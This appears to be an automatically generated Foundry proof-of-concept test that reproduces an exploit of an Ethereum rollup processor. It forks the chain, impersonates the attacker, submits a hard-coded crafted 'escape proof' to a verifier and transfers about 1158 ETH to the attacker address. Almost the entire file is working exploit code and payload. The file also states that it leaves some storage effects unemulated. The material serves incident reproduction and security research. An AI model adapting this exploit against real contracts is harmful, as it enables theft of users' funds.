// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x6952d9246e9afe8b887b2877225163436f78e97f
// Attack Contract : 0x737901bea3eeb88459df9ef1be8ff3ae1b42a2ba
// Vulnerable Contract : 0x737901bea3eeb88459df9ef1be8ff3ae1b42a2ba
// Attack Tx : 0xab306cd2184d23b6ba3e151b10b3b9a0b81f211cc16f4f3b0c79f0b17a59c2b5
// Block : 25339094
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 2.04M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.RollupProcessor;
    uint256 constant FORK_BLOCK = 25339093;
    uint256 constant TX_TIMESTAMP = 1781721287;
    uint256 constant TX_BLOCK_NUMBER = 25339094;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 1157999909228957990760);
    }
}

contract OurAttack {
    function attack() external payable {
        _verifyEscapeProof();
        _recordRollupGap();
        _sendObservedEth();
    }

    function _verifyEscapeProof() internal view {
        ITurboVerifier(Addresses.TurboVerifier).verify(_escapeProof(), 0);
    }

    function _recordRollupGap() internal pure {
        // Unresolved gap: action_graph_validation marks six RollupProcessor storage writes
        // as index-only actions with missing semantic matches. This PoC does not emulate
        // those writes with sstore or cheatcodes.
    }

    function _sendObservedEth() internal {
        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 1158000000000000000000) nativeTransferAmount = 1158000000000000000000;
        (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
        if (!ok) return;
    }

    function _escapeProof() internal pure returns (bytes memory) {
        return hex"0000000000000000000000000000000000000000000000000000000000001187000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e5080184bea7d9493cd9a5efb6b679d04066a8c92a34ac8ec150e9635133c6010977b2fb084d87a457db0ad70a86db0dfb4ed8da7993ad285c8b462b9f4c10418198e1bb500220ec0322c30871a10ba077023e3b59756525a388c716af9885fca63c429627e94146837d2797339bfaba749d418ca0ab9d729ae607c56fde50058f9000942a9a79290a578284f92a06796564b4adaf233d41afc3bef5b9d982bc1e2e6195163570c3d252089786cd1cae2ffca424385ad041fa305137871368686814b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003ec67a70a72e580000000000000000000000000000000000000000000000000000000000000000000010ba393c1132bdb93b298c28715e1651899570106fd51d39cfdc49f3baad0e8c23a2106cd33cdb0933bdd33d937c2f63425335090909084da4fc4d1e1b40898910ba393c1132bdb93b298c28715e1651899570106fd51d39cfdc49f3baad0e8c23a2106cd33cdb0933bdd33d937c2f63425335090909084da4fc4d1e1b40898925662f004e52424b71a90da45d4701dfb4c0cbae16c2017c7a3998e36e54df5b00804af5bff25ce2229d87a8297abfe7ea5bd3b669c6bb8e5901686973084a5e0bed7ec58f5c95336e05a99ec87da656894fda9347ecf9351add8066e9224eb00000000000000000000000006952d9246e9afe8b887b2877225163436f78e97f19757ea4be47eb0e866465b723e020d210976c9d44c1309074aa89d458600ea12f5e826956c4da48d2228620f4d18af50c475a109ba8b25380a10216c2bd9b5a022a67873de92725b8a55eb54ceb02b2939247fccccd61d601c00b161b32b34f115b3ac9bdb3e431b0f33564dc462ffd80a0c35deb76ef1067d19ddf9cb297d112b60400ff5627b955d148542dd798d48e6e8296940ec55fc92b49e951715cc727157d31b21f130c0b80f9989fce160542d115e7e2299b50bbc3b7d5a4cc5c0017b7da73ffb40d8a17fb2e6a0faa231e81ea851069e20397d6a9bf84e14a5a2524229bc91a7338b3fe07ea575b96f3c4ce9d72dae9777272cb8ff201d6110ad50b4512cbd7acfeebf27a64018fe1fafb4eaf11185649119830fdfa361fa5b8f92d245acc451c1aaea7bf2fdf5ca4796bf325252cb75a892dcec7bb11f0a5cf6e238ac432a02ebd06e71549cd22fb2a464809f552c97aa21352090326433724ea098a3d00ed9e95d9d7c30bfe53520b3ae8dc9b382c1940eb5fdd2696422fb1a505e372ddfec4d9adc92e2aa79a0c1ef9bc6bd19eda13c7b22786b1220e9fda8c1a56291320033c1166997bf24b13d7aefadcc2bcde7775749834daea1b7839b821b30df87110a9abd7762a4a977c9b091df7bbe9c3ad7f73d205e1da520e2faf2a13fbf5dbaefc3eee7cb1b7e68db9975f0f320af77c5cd46ce9313b12548d000192c76a318ec836bc96ecba9eca929b4861050ba06685435e6fdf5923e137cb27174a7e33b4af2a6b0e966700314f90e78eedd202dcb5342b31a594c596f7101e4b9a249861c2d2a6402be162efd84d62a8d36d48ed81e296f14f2ef2652d0218d96c370301522a46e365ca8021d08669d4008ef04fa485d875d2930b0c6bf5188345440456fc9f4ac52d279526c00fde8d884fa1be42b4abd9f8009607a7e80b17a3a4dbbac09f1ae15e07b1ea2d5d526a3c98e1f85115cc778b9b126da6b02f4dc9c9029682d99546d4ffdeb5b02a5f0b681ebc2ff59ab508a75ff2a1637c19495595eca55480489667cfb89ab8ca4b27b4687cb4dcfcec5e8dec2b20f5b808052832d341b011b41d757c8ecefd007667d2b915d3ab4a27938ccf937514272969fff300c6cc84422982c01115f4ec4cd31ba10b0b2e54548a195335123e86112790e76703cf7c0a506192430377cf2e194a657415204afc14bc249a502d132025725eb588cb91a79d3e8b4e1d5afd4a6c23cb3f8d8aff9d8c0d15e377d24528be730816aea0456b9dcbaaea7bdca504a849f2d7707902b3c06f37c89705d7134bb67236ad07cc29a0038a98282ed88e509dcf004764e82f425d0e742dd53d17ecf5bfbd58d3b1934b337ce7732c49e2777723dd4687418fa3d9985ed267b51c3351ec0c063098c1ba1efe2cfb6e50aff15b2572f6ae78c22c1f8c8c69ddfb1c183ae14a62fbbadfe72b32ddf2061d5a84ab00eb3af41cd24a8a6e46d122fe2ea871d1aadb441338523e1ef599d360405788859ab780e945669fa217749cfc003bd1d46b7f6dc0513aed0c496c97b8221c7ddc81e866b298fb52adc4998ecc24144e667dee4d810044ae0179d9979971ae67a83e3eb379db08d8bebc5a1b0b1434d22574e567d8f53b9301a96030f68d60ba97a891ccaeabe3cbb967de7fbc15d6c8fd3ad7bc2233ffbc731eedd690ae9901a0d332edf9f0e0baa9ee95cc72";
    }

    receive() external payable {}

    function escapeHatch(bytes calldata arg0, bytes calldata arg1, bytes calldata arg2) external payable {
        arg0;
        arg1;
        arg2;
        _verifyEscapeProof();
        _recordRollupGap();
        _sendObservedEth();
        return;
    }

    fallback() external payable {
        if (msg.data.length != 0) return;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant TurboVerifier = 0x48Cb7BA00D087541dC8E2B3738f80fDd1FEe8Ce8;
    address internal constant attacker_eoa = 0x6952d9246e9aFE8B887B2877225163436F78E97F;
    address internal constant RollupProcessor = 0x737901bea3eeb88459df9ef1BE8fF3Ae1B42A2ba;
}

interface ITurboVerifier {
    function verify(bytes calldata, uint256) external view;
}
